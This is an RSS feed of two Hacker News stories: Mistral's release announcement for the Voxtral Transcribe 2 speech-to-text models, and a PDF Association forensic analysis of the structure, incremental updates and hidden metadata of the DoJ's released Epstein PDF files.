(ignoring known css parsing error)
(ignoring known css parsing error)
<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 04 Feb 2026 17:30:07 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Voxtral Transcribe 2 (194 pts)]]></title>
            <link>https://mistral.ai/news/voxtral-transcribe-2</link>
            <guid>46886735</guid>
            <pubDate>Wed, 04 Feb 2026 15:08:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mistral.ai/news/voxtral-transcribe-2">https://mistral.ai/news/voxtral-transcribe-2</a>, See on <a href="https://news.ycombinator.com/item?id=46886735">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p dir="ltr">Today, we're releasing Voxtral Transcribe 2, two next-generation speech-to-text models with state-of-the-art transcription quality, diarization, and ultra-low latency. The family includes Voxtral Mini Transcribe V2 for batch transcription and Voxtral Realtime for live applications. Voxtral Realtime is open-weights under the Apache 2.0 license.</p>
<p dir="ltr">We're also launching an <a href="https://console.mistral.ai/build/audio/speech-to-text">audio playground in Mistral Studio</a> to test transcription instantly, powered by Voxtral Transcribe 2, with diarization and timestamps.</p>
<h2 dir="ltr">Highlights.</h2>
<ul>
<li dir="ltr" aria-level="1">
<p dir="ltr" role="presentation">Voxtral Mini Transcribe V2: State-of-the-art transcription with speaker diarization, context biasing, and word-level timestamps in 13 languages.</p>
</li>
<li dir="ltr" aria-level="1">
<p dir="ltr" role="presentation">Voxtral Realtime: Purpose-built for live transcription with latency configurable down to sub-200ms, enabling voice agents and real-time applications.</p>
</li>
<li dir="ltr" aria-level="1">
<p dir="ltr" role="presentation">Best-in-class efficiency: Industry-leading accuracy at a fraction of the cost, with Voxtral Mini Transcribe V2 achieving the lowest word error rate, at the lowest price point.</p>
</li>
<li dir="ltr" aria-level="1">
<p dir="ltr" role="presentation">Open weights: Voxtral Realtime ships under Apache 2.0, deployable on edge for privacy-first applications.</p>
</li>
</ul>
<h2 dir="ltr">Voxtral Realtime.</h2>
<p dir="ltr">Voxtral Realtime is purpose-built for applications where latency matters. Unlike approaches that adapt offline models by processing audio in chunks, Realtime uses a novel streaming architecture that transcribes audio as it arrives. The model delivers transcriptions with delay configurable down to sub-200ms, unlocking a new class of voice-first applications.</p>
<p dir="ltr"><img src="https://cms.mistral.ai/assets/a21cafea-208d-4290-b65e-36c0514dc179.png?width=2621&amp;height=1293" alt="Fleur Voxtral 2"></p>
<p dir="ltr"><em>Word error rate (lower is better) across languages in the FLEURS transcription benchmark.</em></p>
<p dir="ltr">At 2.4 seconds delay, ideal for subtitling, Realtime matches Voxtral Mini Transcribe V2, our latest batch model. At 480ms delay, it stays within 1-2% word error rate, enabling voice agents with near-offline accuracy.</p>
<p dir="ltr">The model is natively multilingual, achieving strong transcription performance in 13 languages, including English, Chinese, Hindi, Spanish, Arabic, French, Portuguese, Russian, German, Japanese, Korean, Italian, and Dutch. With a 4B parameter footprint, it runs efficiently on edge devices, ensuring privacy and security for sensitive deployments.</p>
<p dir="ltr">We’re releasing the model weights under Apache 2.0 on the <a href="https://huggingface.co/mistralai/Voxtral-Mini-4B-Realtime-2602" target="_blank" rel="noopener">Hugging Face Hub.</a></p>
<h2 dir="ltr">Voxtral Mini Transcribe V2.</h2>
<p><img src="https://cms.mistral.ai/assets/6b8d07b0-1526-4e94-ac66-a861f092aa41.png?width=1775&amp;height=1103" alt="Voxtral 2.0   Avg Diarization Error Rate   Priceper Min"></p>
<p><em>Average diarization error rate (lower is better) across five English benchmarks (Switchboard, CallHome, AMI-IHM, AMI-SDM, SBCSAE) and the TalkBank multilingual benchmark (German, Spanish, English, Chinese, Japanese).</em></p>
<p><img src="https://cms.mistral.ai/assets/58664549-fe38-420a-86fd-5c7003476689.png?width=1775&amp;height=1111" alt="Voxtral 2.0   Transcription Performance Fleurs   Priceper Min"></p>
<p><em>Average word error rate (lower is better) across the top-10 languages in the FLEURS transcription benchmark.</em></p>
<p>Voxtral Mini Transcribe V2 delivers significant improvements in transcription and diarization quality across languages and domains. At approximately 4% word error rate on FLEURS and $0.003/min, Voxtral offers the best price-performance of any transcription API. It outperforms GPT-4o mini Transcribe, Gemini 2.5 Flash, Assembly Universal, and Deepgram Nova on accuracy, and processes audio approximately 3x faster than ElevenLabs’ Scribe v2 while matching on quality at one-fifth the cost.</p>
<h3 dir="ltr">Enterprise-ready features.</h3>
<p dir="ltr">Voxtral Mini Transcribe V2 introduces key capabilities for enterprise deployments.</p>
<div>
<div><p><img src="https://cms.mistral.ai/assets/4b23530e-23c1-4a58-8296-c61a1d5cff98.png?width=96&amp;height=96" alt="Icon Language"></p><h4>Speaker diarization.</h4>
<p dir="ltr">Generate transcriptions with speaker labels and precise start/end times. Ideal for meeting transcription, interview analysis, and multi-party call processing. Note: with overlapping speech, the model typically transcribes one speaker.</p>
</div>
<div><p><img src="https://cms.mistral.ai/assets/221e1a35-1b56-41a1-b294-6e5a3492e0cd.png?width=72&amp;height=64" alt="Icon Filters"></p><h4>Context biasing.</h4>
<p dir="ltr">Provide up to 100 words or phrases to guide the model toward correct spellings of names, technical terms, or domain-specific vocabulary. Particularly useful for proper nouns or industry terminology that standard models often miss. Context biasing is optimized for English; support for other languages is experimental.</p>
</div>
<div><p><img src="https://cms.mistral.ai/assets/e8c644a8-93bf-49c0-ae96-a859c1cec3ad.svg?width=32&amp;height=32" alt="Word-level timestamps."></p><h4>Word-level timestamps.</h4>
<p dir="ltr">Generate precise start and end timestamps for each word, enabling applications like subtitle generation, audio search, and content alignment.</p>
</div>
</div>
<div>
<div><p><img src="https://cms.mistral.ai/assets/ecdac1ed-522e-4a58-a3cc-23d03c40ba6e.png?width=96&amp;height=96" alt="Icon Earth Black"></p><h4>Expanded language support.</h4>
<p dir="ltr">Like Realtime, this model now supports 13 languages: English, Chinese, Hindi, Spanish, Arabic, French, Portuguese, Russian, German, Japanese, Korean, Italian, and Dutch. Non-English performance significantly outpaces competitors.</p>
</div>
<div><p><img src="https://cms.mistral.ai/assets/ec93c74e-5cdd-4950-b494-0a8f3a43dd74.svg?width=32&amp;height=32" alt="Noise robustness."></p><h4>Noise robustness.</h4>
<p dir="ltr">Maintains transcription accuracy in challenging acoustic environments, such as factory floors, busy call centers, and field recordings.</p>
</div>
<div><p><img src="https://cms.mistral.ai/assets/d18e43b2-1c42-4916-b787-d28739220476.svg?width=32&amp;height=32" alt="Longer audio support."></p><h4>Longer audio support.</h4>
<p dir="ltr">Process recordings up to 3 hours in a single request.</p>
</div>
</div>
<p dir="ltr"><img src="https://cms.mistral.ai/assets/97f4a4ee-7448-4a2f-889e-17409821e503.png?width=2849&amp;height=1358" alt="FlEURS"></p>
<p><em>Word error rate (lower is better) across languages in the FLEURS transcription benchmark.</em></p>
<h2 dir="ltr">Audio playground.</h2>
<p dir="ltr">Test Voxtral Transcribe 2 directly in <a href="https://console.mistral.ai/build/audio/speech-to-text">Mistral Studio</a>. Upload up to 10 audio files, toggle diarization, choose timestamp granularity, and add context bias terms for domain-specific vocabulary. Supports .mp3, .wav, .m4a, .flac, .ogg up to 1GB each.</p>
<p dir="ltr"><iframe title="YouTube video player" src="https://www.youtube.com/embed/93ZAhW3bk8g" width="560" height="315" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe></p>
<h2 dir="ltr">Transforming voice applications.</h2>
<p dir="ltr">Voxtral powers voice workflows in diverse applications and industries.</p>
<ul>
<li>
<h3 dir="ltr">Meeting intelligence.</h3>
<p dir="ltr">Transcribe multilingual recordings with speaker diarization that clearly attributes who said what and when. At Voxtral's price point, annotate large volumes of meeting content at industry-leading cost efficiency.</p>
</li>
<li>
<h3 dir="ltr">Voice agents and virtual assistants.</h3>
<p dir="ltr">Build conversational AI with sub-200ms transcription latency. Connect Voxtral Realtime to your LLM and TTS pipeline for responsive voice interfaces that feel natural.</p>
</li>
<li>
<h3 dir="ltr">Contact center automation.</h3>
<p dir="ltr">Transcribe calls in real time, enabling AI systems to analyze sentiment, suggest responses, and populate CRM fields while conversations are still happening. Speaker diarization ensures clear attribution between agents and customers.</p>
</li>
<li>
<h3 dir="ltr">Media and broadcast.</h3>
<p dir="ltr">Generate live multilingual subtitles with minimal latency. Context biasing handles proper nouns and technical terminology that trip up generic transcription services.</p>
</li>
<li>
<h3 dir="ltr">Compliance and documentation.</h3>
<p dir="ltr">Monitor and transcribe interactions for regulatory compliance, with diarization providing clear speaker attribution and timestamps enabling precise audit trails.</p>
</li>
</ul>
<p dir="ltr">Both models support GDPR and HIPAA-compliant deployments through secure on-premise or private cloud setups.</p>
<h2 dir="ltr">Get started.</h2>
<p dir="ltr"><a href="https://docs.mistral.ai/models/voxtral-mini-transcribe-26-02">Voxtral Mini Transcribe V2</a> is available now via API at $0.003 per minute. Try it now in the new Mistral Studio <a href="https://console.mistral.ai/build/audio/speech-to-text">audio playground</a> or in <a href="http://chat.mistral.ai/">Le Chat</a>.</p>
<p dir="ltr"><a href="https://docs.mistral.ai/models/voxtral-mini-transcribe-realtime-26-02">Voxtral Realtime</a> is available via API at $0.006 per minute and as open weights on <a href="https://huggingface.co/mistralai/Voxtral-Mini-3B-Realtime-2602">Hugging Face</a>.</p>
<p dir="ltr"><a href="https://docs.mistral.ai/capabilities/audio_transcription">Explore documentation</a> on Mistral’s audio and transcription capabilities.</p>
<h2 dir="ltr">We’re hiring.</h2>
<p dir="ltr">If you're excited about building world-class speech AI and putting frontier models into the hands of developers everywhere, we'd love to hear from you. <a href="https://mistral.ai/careers">Apply to join our team</a>.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A case study in PDF forensics: The Epstein PDFs (125 pts)]]></title>
            <link>https://pdfa.org/a-case-study-in-pdf-forensics-the-epstein-pdfs/</link>
            <guid>46886440</guid>
            <pubDate>Wed, 04 Feb 2026 14:46:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pdfa.org/a-case-study-in-pdf-forensics-the-epstein-pdfs/">https://pdfa.org/a-case-study-in-pdf-forensics-the-epstein-pdfs/</a>, See on <a href="https://news.ycombinator.com/item?id=46886440">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>The recent release of a <a href="https://www.justice.gov/epstein/doj-disclosures" target="_blank" rel="noopener">tranche of files</a> by the US Department of Justice (DoJ) under the “Epstein Files Transparency Act (H.R.4405)” has once again prompted many people to closely examine redacted and sanitized PDF documents. Our previous articles on the <a href="https://pdfa.org/corruption-in-pdf-federal-crimes-edition/">Manafort papers</a> and the <a href="https://pdfa.org/a-technical-and-cultural-assessment-of-the-mueller-report-pdf/">Mueller report</a>, as well as a study by Adhatarao, S. and Lauradoux, C. (2021) “<a href="https://doi.org/10.1145/3437880.3460405" target="_blank" rel="noopener">Exploitation and Sanitization of Hidden Data in PDF Files: Do Security Agencies Sanitize Their PDF files?</a>,” in <em>Proceedings of the 2021 ACM Workshop on Information Hiding and Multimedia Security</em>, illustrate the importance of robust sanitization and redaction workflows when handling sensitive documents prior to release.</p>
<p>This article examines a small random selection of the Epstein PDF files from a purely digital forensic perspective, focusing on the PDF syntax and idioms they contain, any malformations or unusual constructs, and other technical aspects.</p>
<p>PDFs are more challenging to analyze than many other formats because they are binary files that require specialized knowledge, expertise, and software. Please note that we did not analyze the contents of the PDF documents. Not every PDF was examined. Any mention of products (or appearance in screen-shots) does not imply any endorsement or support of any information, products, or providers whatsoever. We are not lawyers; this article does not constitute legal advice</p>
<p>We offer this information, in part, as some of the Epstein PDFs released by DoJ are beginning to appear on malware analysis sites (such as <a href="https://hybrid-analysis.com/sample/d8f6ba273d416f1b3160b94b5646374b218a9ecef9d2cb3ae33cd3788f8f862b/6946599fcca0461fcc056ab2" target="_blank" rel="noopener">Hybrid-Analysis</a>) with various kinds of incorrect analysis and misinformation.</p>
<h2 id="26-december-2025-update">26 December 2025 update</h2>
<p>After we'd completed our analysis the DoJ released a new dataset, <a href="https://www.justice.gov/epstein/files/DataSet%208.zip">DataSet 8.zip</a>. This new ZIP file is 9.95 GB compressed and contains over 11,000 files, including 10,593 new PDFs totaling 1.8 GB and 29,343 pages (the longest document has 1,060 pages). DataSet 8 also contains many large MP4 movies, Excel spreadsheets, and various other files. The first PDF in the set of 10,593 PDFs is VOL00008\IMAGES\0001\EFTA00009676.pdf, and the last file is VOL00008\IMAGES\0011\EFTA00039023.pdf. A cursory analysis shows <span>pdfinfo</span> properties similar to those from the earlier datasets, but we have not otherwise analyzed this new dataset.</p>
<p>Since our original post, various social media and news platforms have also been announcing “recoverable redactions” from the “Epstein Files”. We stand by our analysis; DoJ has correctly redacted the EFTA PDFs in Datasets 01-07, and they <b><i>do not contain</i></b> recoverable text as alleged. As our article states, we did not analyze any other DoJ or Epstein-related documents.</p>
<p>For example, the featured image in <a href="https://www.theguardian.com/us-news/2025/dec/23/epstein-unredacted-files-social-media">this Guardian news article</a> (which was also picked up by the <a href="https://www.nytimes.com/2025/12/23/us/politics/epstein-files-redactions-doj.html">New York Times</a>) corresponds to VOL00004\IMAGES\0001EFTA00005855.pdf, as can be easily determined by searching for the Bates Numbers in the EFTA “.OPT” data files. The information in this EFTA PDF is <b><i>fully and correctly redacted</i></b>; there is <b><i>no hidden information</i></b>. The only extractable text is some garbled text from the poor-quality OCR and, as expected, the Bates Numbers on each page.</p>
<p>In the few reports we investigated (including from <a href="https://www.forbes.com/sites/daveywinder/2025/12/26/epstein-files-hacked---all-you-need-to-know">Forbes</a> and Ed Krassenstein on both <a href="https://x.com/EdKrassen/status/2003222444270661801">X (formerly Twitter)</a> and <a href="https://www.instagram.com/krassensteins?igsh=eGYyc3gwZXA2eW4=">Instagram</a>), these stories misrepresent <strong><i>other</i></strong> DoJ files that were <b><i>not</i></b> part of the major DataSets 01-07 release on December 19 under the EFTA. All PDFs released under EFTA have a Bates Number on every page starting "EFTA". These include “<a href="https://www.justice.gov/multimedia/Court%20Records/Government%20of%20the%20United%20States%20Virgin%20Islands%20v.%20JPMorgan%20Chase%20Bank,%20N.A.,%20No.%20122-cv-10904%20(S.D.N.Y.%202022)/001-01.pdf">Case 1:22-cv-10904-JSR &nbsp; Document 1-1,&nbsp; Exhibit 1 to Government’s Complaint against JPMorgan Chase Bank, N.A.</a>” (see page 41) and “<a href="https://www.justice.gov/multimedia/Court%20Records/Matter%20of%20the%20Estate%20of%20Jeffrey%20E.%20Epstein,%20Deceased,%20No.%20ST-21-RV-00005%20(V.I.%20Super.%20Ct.%202021)/2022.03.17-1%20Exhibit%201.pdf">Case No: ST-20-CV-14 Government Exhibit 1</a>” (see page 19). These PDFs, previously released by the DoJ, do contain incorrect and ineffective redactions, with black boxes that simply obscure text, making “copy &amp; paste” easy to recover the text that's otherwise hidden. Clearly, DoJ processes and systems in the past have inadequately redacted information!</p>
<h2 id="the-files-we-examined">The files we examined</h2>
<p>The tranche released by DoJ on Friday, December 19 is available as seven “data sets”, most easily downloaded as seven ZIP archives totaling just under 2.97 GB. Each ZIP file contains a similar folder structure, with DataSet 6 being the odd one out with an extra top-level folder. Once unzipped, the total size is 2.99 GB. The tranche contains 4,085 PDF files, a single AVI (movie) file (located in the folder VOL00002\NATIVES\0001), and 2 data files (.DAT and .OPT) for each ZIP archive. The “.OPT” files appear to be CSV (<a href="https://en.wikipedia.org/wiki/Comma-separated_values" target="_blank" rel="noopener">Comma-Separated Values</a>) but lack a heading row, while the “.DAT” files contain information about the <a href="https://en.wikipedia.org/wiki/Bates_numbering" target="_blank" rel="noopener">Bates numbering</a>. The analysis we provide here is limited to the PDF files.</p>
<p>The PDF files are named and ordered sequentially within the folder structure, starting with “EFTA00000001.pdf” in VOL00001 and ending with “EFTA00009664.pdf” in VOL00007, indicating that <span><strong>at least 5,879 PDF files remain unreleased</strong></span>.</p>
<p>A random sampling of the PDFs for visual review suggests that they are a mix of single and multi-page full-page photos and scanned content. OCR (Optical Character Recognition) was used to provide some searchable and extractable text in at least some files. “Black box” style redactions (without text reasons) are apparent. When done correctly, this is the appropriate way to redact, far more robust than <a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/stop-pixelating-new-tool-reveals-the-secrets-of-redacted-documents" target="_blank" rel="noopener">pixelating text</a>. The PDFs we sampled did not include any obviously “born digital” documents. Various news sites are reporting <a href="https://www.cbsnews.com/news/epstein-files-redaction-over-500-pages-entirely-blacked-out/" target="_blank" rel="noopener">very heavily redacted documents</a> within this tranche.</p>
<h2 id="file-validity">File validity</h2>
<p>A precursor to most forensic examinations is to establish whether the PDF files are technically valid (that is, conform to the rules of the PDF format), since analyzing malformed files can easily lead to incorrect results or wrong conclusions. Combining tools that use different methods provides the broadest possible information while ensuring that tooling limitations are fully understood. However, if the basic file structure or cross-reference information is incorrect, various software might then draw different conclusions and/or construct different Document Object Models (DOMs).</p>
<p>In addition to basic file structure, incremental updates (if any), and cross-reference information, PDF validity assessments include the objects that comprise the PDF’sDOM as well as the file structure, incremental updates, and cross-reference information. To assess relationships between objects in the PDF DOM, some forensic analysis tools leverage our <a href="https://github.com/pdf-association/arlington-pdf-model" target="_blank" rel="noopener">Arlington PDF Data Model</a>, while others use their own internal methods.</p>
<p>Our analysis of file validity, using a multitude of PDF forensic tools, identified only one minor defect (invalidity); 109 PDFs had a positive FontDescriptor <strong>Descent</strong> value rather than a negative one. This is a relatively common (but minor) error, typically associated with font substitution and font matching, that does not affect the validity of the files overall. One specific forensic tool reported a PDF version issue with some files, related to the document catalog <strong>Version</strong> entry, which prevented the tool from further verifying those specific PDFs.</p>
<h2 id="pdf-versions">PDF versions</h2>
<p>I’ve previously written about the <a href="https://pdfa.org/pdf-versions/">unreliability of PDF version numbers</a>. Still, for forensic purposes, they may provide insight into the DoJ’s software, and whether improved software could have performed better.</p>
<p>I used two different but commonly used PDF command-line <code>pdfinfo</code> utilities on different platforms (Windows and Ubuntu Linux) to summarize information about these PDF files. When run against the full tranche of PDFs, I got two very different sets of answers! Immediately, my <a href="https://en.wiktionary.org/wiki/Spidey_sense#English" target="_blank" rel="noopener">spidey senses</a> started to tingle, and I was once again reminded of a key lesson in digital document forensics – you should <em><span>never</span></em> trust a single tool!</p>
<table>
<tbody>
<tr>
<td><strong>Reported PDF Version</strong></td>
<td><strong>Count Tool A</strong></td>
<td><strong>Count Tool B</strong></td>
</tr>
<tr>
<td>1.3</td>
<td>209</td>
<td>3,817</td>
</tr>
<tr>
<td>1.4</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>1.5</td>
<td>3,875</td>
<td>267</td>
</tr>
<tr>
<td><strong>TOTAL</strong> <em>(should be 4,085)</em></td>
<td>4,085</td>
<td>4,085</td>
</tr>
</tbody>
</table>

<p>The PDF version in the file header, “<code>%PDF-<em>x.y</em></code>”, is nominally the first line in every PDF file (based on the not-unreasonable assumption that the PDF files have no “junk bytes” before this PDF file identifier). Using the Linux command line, you can run in Linux “<code>head -n 1 <em>file.pdf</em></code>” to extract the first header line from each PDF and compare it with the reported results from each tool. Or run in Linux “<code>grep -P --text --byte-offset "%PDF-\d\.\d" *.pdf</code>” to confirm that there are no junk bytes prior to the PDF header line.</p>
<p>The reason for the difference reported in the table above is that Tool B is not accounting for the <strong>Version</strong> entry in the document catalog of PDFs with incremental updates. We’ll next investigate whether this is due to malformed files or a programming error. When properly accounting for incremental updates, however, Tool A is correct.</p>
<p>Using the same <code>pdfinfo</code> output (and again comparing results from both tools), we can also quickly establish the following facts:</p>
<ul>
<li>No PDF is tagged</li>
<li>No PDF is encrypted</li>
<li>No PDF is “optimized” (technically, Linearized PDF)</li>
<li>No PDF has any annotations</li>
<li>No PDF has any outlines (bookmarks)</li>
<li>No PDF contains any embedded files</li>
<li>None of the PDFs are forms</li>
<li>None of the PDFs contains JavaScript</li>
</ul>
<p>Page counts range from 1 (in 3,818 PDFs) to 119 pages (in two PDFs), totaling 9,659 pages across all 4,085 PDFs.</p>
<h2 id="incremental-updates">Incremental updates</h2>
<p>PDF’s incremental updates feature allows multiple revisions of a document to be stored in a PDF file. As the name implies, each set of deltas is appended to the original document, forming a chain of edits. When read by conforming PDF software, a PDF is <em><span>always</span></em> processed from the end of the file, effectively applying the deltas to the original document and to any previous incremental updates. Both the original document and each incremental update can be recognized by their respective “<code>xref</code>” and “<code>%%EOF</code>” markers (assuming that the PDF files are structured correctly).</p>
<p>For this investigation, we started by examining the very first PDF in the tranche: VOL00001\IMAGES\0001\EFTA00000001.pdf. This PDF had different PDF versions reported by different versions of <code>pdfinfo</code>. A simple trick to check if a PDF contains incremental updates is to search for these special markers while treating the PDF as a text file (<em>which it isn’t!</em>):</p>
<p><strong><code>$ grep -P --text -–byte-offset "(xref)|(%%EOF)" EFTA00000001.pdf</code></strong><br>
<code>371340:xref<br>
371758:startxref<br>
371775:%%EOF<br>
372977:startxref<br>
372994:%%EOF<br>
373961:startxref<br>
373978:%%EOF</code></p>
<p>These results (sorted by byte offset) indicate that EFTA00000001.pdf contains <em><span>two incremental updates after the original file</span></em>. The lack of an “<code>xref</code>” marker before the last two “<code>startxref</code>” markers indicate that neither incremental updates uses conventional cross-reference data, but may use cross-reference streams (if any objects are changed).</p>
<h2 id="bates-numbering">Bates numbering</h2>
<p>As referenced above, Bates numbering is the process by which every page is assigned a unique identifier. For this tranche of Epstein PDF files, Bates numbers were added to each page via a separate incremental update, as shown below in <a href="https://pdfa.org/resource/vscode-extension-pdf-cos-syntax-support/">Visual Studio Code with my pdf-cos-syntax extension</a>. Note that DoJ’s PDFs are primarily text-based internally, making forensic analysis a lot easier - and the files a lot bigger.</p>
<p><img decoding="async" src="https://pdfa.org/wp-content/uploads/2025/12/2984-3037.png" alt="Screenshot of VS Code discussed in the text." width="766" height="1284" srcset="https://pdfa.org/wp-content/uploads/2025/12/2984-3037.png 766w, https://pdfa.org/wp-content/uploads/2025/12/2984-3037-179x300.png 179w, https://pdfa.org/wp-content/uploads/2025/12/2984-3037-611x1024.png 611w, https://pdfa.org/wp-content/uploads/2025/12/2984-3037-600x1006.png 600w" sizes="(max-width: 766px) 100vw, 766px"></p>
<p>Observations:</p>
<ul>
<li>Line 2984 is the end-of-file marker for the file version, and line 2985 starts a new incremental update section.</li>
<li>Lines 2985-2987 define object 26, the unembedded Helvetica font resource used by the Bates number.</li>
<li>Lines 2997-3020 are the modified page object (object 3), replacing the page object in previous revisions of the file.</li>
<li>Line 2999 is the page Contents array, comprising five separate content streams, with the 3rd stream (object 29) being the Bates numbering added in this incremental update. Object 30 is an empty content stream that could have been removed by an optimization process.</li>
<li>Line 3034 sets the Helvetica font to 12 point.</li>
<li>Line 3037 uses a hexadecimal string to paint the Bates number onto the page.</li>
</ul>
<p>The idiom for this final incremental update, which adds the Bates number to every page, appears in all the PDF files we selected at random for investigation. This specific incremental update always uses a cross-reference stream (<code>/Type /XRef</code>) and relies on the previous incremental update, in which the document catalog <strong>Version</strong> entry is set to PDF 1.5.</p>
<h2 id="the-first-incremental-update">The first incremental update</h2>
<p>The VSCode pdf-cos-syntax extension also indicates (correctly!) that the original PDF is missing the required (when the PDF contains binary data, which most do) comment as the second line of the file that indicates to software that the PDF file needs to be treated as binary data (ISO 32000-2:2020, §7.5.2). Although the missing comment does not make the PDF invalid per se, without such a marker close to the top of each PDF, software may think the PDF is a text file, and thus potentially corrupt the PDF by changing line endings, which would break the byte offsets in the cross-reference data. In this PDF, the first incremental update adds this marker comment after a lot of binary data, which is pointless.</p>
<p>As mentioned above, the first incremental update changed the document catalog <strong>Version</strong> entry to PDF 1.5, as we see in this next screenshot:</p>
<p><img decoding="async" src="https://pdfa.org/wp-content/uploads/2025/12/2924-3000.png" alt="Screenshot of VS Code discussed in the text." width="766" height="1284" srcset="https://pdfa.org/wp-content/uploads/2025/12/2924-3000.png 766w, https://pdfa.org/wp-content/uploads/2025/12/2924-3000-179x300.png 179w, https://pdfa.org/wp-content/uploads/2025/12/2924-3000-611x1024.png 611w, https://pdfa.org/wp-content/uploads/2025/12/2924-3000-600x1006.png 600w" sizes="(max-width: 766px) 100vw, 766px"></p>
<p><span>Observations:</span></p>
<ul>
<li><span>Lines 2953-2984 are the incremental update section.</span></li>
<li><span>Line 2954 is a PDF comment. PDF comments always start with a PERCENT SIGN (<code>%</code>) and may occur in many places in PDF files. Effective sanitization and redaction workflows typically remove all comments from PDFs because they may inadvertently disclose information, but this exact comment appears in 3,608 other PDF files. The origin or meaning of this comment was not further investigated.</span></li>
<li><span>Line 2964 upgrades the PDF version to 1.5. At first glance, this may appear to be perfectly valid PDF, but it is technically incorrect because the file header is <code>%PDF-1.3</code> yet the <strong>Version</strong> key was only added in PDF 1.4 - this is what the strict file validation tool mentioned above had noticed. As object 24 is a compressed object stream (lines 2966-2973) and object 25 is a compressed cross-reference stream (lines 2974-2981), the indicated version should be PDF 1.5. As a practical matter, however, this level of technical detail does not impact operation or behavior of PDFs.</span></li>
<li><span>Line 2984 is the end-of-section “<code>%%EOF</code>” marker for this incremental update section.</span></li>
</ul>
<p><span>As this section of the PDF uses compressed object streams, specialized PDF forensic tools must be used… simple search methodologies, such as those mentioned above, may not identify everything!</span></p>
<p><span>We know that there are 7 objects (because we find /<code>N 7</code>) inside the object stream:</span></p>
<p><img loading="lazy" decoding="async" src="https://pdfa.org/wp-content/uploads/2025/12/pdf-debugger.png" alt="Screenshot of debugger displaying content discussed in the text." width="676" height="443" srcset="https://pdfa.org/wp-content/uploads/2025/12/pdf-debugger.png 676w, https://pdfa.org/wp-content/uploads/2025/12/pdf-debugger-300x197.png 300w, https://pdfa.org/wp-content/uploads/2025/12/pdf-debugger-600x393.png 600w" sizes="auto, (max-width: 676px) 100vw, 676px"></p>
<p><span>As per PDF’s specification, ISO 32000-2:2020, §7.5.7, the first line of integers is interpreted as N pairs, where the first integer is the object number and the second integer is the byte offset relative to the first object in the object stream.</span></p>
<table>
<tbody>
<tr>
<td><strong>N</strong></td>
<td><strong>1st integer (object number)</strong></td>
<td><strong>2nd integer (start offset)</strong></td>
<td><strong>Explanation</strong></td>
<td><strong>Content</strong></td>
</tr>
<tr>
<td>1</td>
<td>19</td>
<td>0</td>
<td>Type1 Font object for OPBaseFont0 (Courier)</td>
<td><span>&lt;&lt;/BaseFont/Courier/Encoding&lt;&lt;/BaseEncoding/WinAnsiEncoding/Type/Encoding&gt;&gt;/Name/OPBaseFont0/Subtype/Type1/Type/Font&gt;&gt;</span></td>
</tr>
<tr>
<td>2</td>
<td>20</td>
<td>118</td>
<td>Type1 Font object for OPBaseFont1 (Helvetica)</td>
<td><span>&lt;&lt;/BaseFont/Helvetica/Encoding&lt;&lt;/BaseEncoding/WinAnsiEncoding/Type/Encoding&gt;&gt;/Name/OPBaseFont1/Subtype/Type1/Type/Font&gt;&gt;</span></td>
</tr>
<tr>
<td>3</td>
<td>17</td>
<td>238</td>
<td>Document information (Info) dictionary</td>
<td><span>&lt;&lt;/CreationDate(D:20251218143205)/Creator(OmniPage CSDK 21.1)/ModDate(D:20251218143205)/Producer(Processing-CLI)&gt;&gt;</span></td>
</tr>
<tr>
<td>4</td>
<td>18</td>
<td>352</td>
<td>ProcSet resources array</td>
<td><span>[/PDF/Text/ImageB/ImageC/ImageI]</span></td>
</tr>
<tr>
<td>5</td>
<td>22</td>
<td>384</td>
<td>Resources dictionary for the page</td>
<td><span>&lt;&lt;/Font&lt;&lt;/OPBaseFont0 19 0 R/OPBaseFont1 20 0 R&gt;&gt;/ProcSet 18 0 R/XObject&lt;&lt;/Im0 8 0 R&gt;&gt;&gt;&gt;</span></td>
</tr>
<tr>
<td>6</td>
<td>23</td>
<td>472</td>
<td>Array of 2 indirect references (to content streams)</td>
<td><span>[21 0 R 4 0 R]</span></td>
</tr>
<tr>
<td>7</td>
<td>3</td>
<td>486</td>
<td>Updated Page object</td>
<td><span>&lt;&lt;/Contents 23 0 R/MediaBox[0 0 864 576.75]/Parent 2 0 R/Resources 22 0 R/Thumb 11 0 R/Type/Page&gt;&gt;</span></td>
</tr>
</tbody>
</table>

<p>What is very interesting here – from a PDF forensics perspective – is the fact of a <strong><em><span>hidden document information dictionary</span></em></strong> that is not referenced from the last (final) incremental update trailer (i.e., there is no <strong>Info</strong> entry in object 31, lines 3050-3063 below). As such, this orphaned dictionary is invisible to PDF software! This oddity occurs in all other PDFs we’d randomly selected for investigation.</p>
<p><img loading="lazy" decoding="async" src="https://pdfa.org/wp-content/uploads/2025/12/2985-3067.png" alt="Screenshot of VS Code discussed in the text." width="777" height="1144" srcset="https://pdfa.org/wp-content/uploads/2025/12/2985-3067.png 777w, https://pdfa.org/wp-content/uploads/2025/12/2985-3067-204x300.png 204w, https://pdfa.org/wp-content/uploads/2025/12/2985-3067-695x1024.png 695w, https://pdfa.org/wp-content/uploads/2025/12/2985-3067-768x1131.png 768w, https://pdfa.org/wp-content/uploads/2025/12/2985-3067-600x883.png 600w" sizes="auto, (max-width: 777px) 100vw, 777px"></p>
<p><span>Formatted nicely as an uncompressed object, this hidden document information dictionary inside the compressed object stream contains the following information (the CreationDate and ModDate appear to change in other randomly examined PDFs):</span></p>
<pre>     17 0 obj
     &lt;&lt;
          /CreationDate (D:20251218143205)
          /ModDate      (D:20251218143205)
          /Creator      (OmniPage CSDK 21.1)
          /Producer     (Processing-CLI)
     &gt;&gt;
     endobj</pre>
<p>This metadata clearly indicates the software DoJ used to manipulate these PDF files. Although not relevant to the content, this forensic discovery clearly shows that extra care is required when sanitizing PDFs.</p>
